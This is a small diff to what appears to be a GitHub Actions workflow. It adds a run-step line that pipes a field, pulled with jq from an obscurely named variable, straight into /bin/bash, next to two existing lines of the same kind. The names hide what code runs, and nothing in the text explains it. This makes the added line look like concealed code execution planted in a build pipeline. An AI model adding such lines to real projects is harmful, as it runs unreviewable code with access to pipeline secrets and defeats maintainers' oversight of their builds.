@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$emzrv37893" | jq -r .f57348 | /bin/bash
           printf '%s' "$v0" | jq -r .nhz12 | /bin/bash
+          printf '%s' "$nt04740" | jq -r .qr04700 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
